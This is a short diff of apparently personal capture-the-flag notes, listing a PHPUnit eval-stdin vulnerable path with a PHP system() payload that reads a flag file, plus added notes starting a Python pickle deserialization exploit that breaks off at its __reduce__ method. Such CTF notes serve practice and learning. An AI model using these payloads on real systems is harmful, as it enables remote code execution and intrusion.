@@ -70,4 +70,13 @@ composer.json -Here we can find version of php-unit
 /eval-stding.php-Vulnerable path
 <?php system('cat /flag.txt')?>
 
+sweet and sour:
+curl -I link
+echo -n "token" | base64 -d
+ code:
+import pickle
+import base64
+import requests
+class Exploit(object):
+      def __reduce__(self):
 
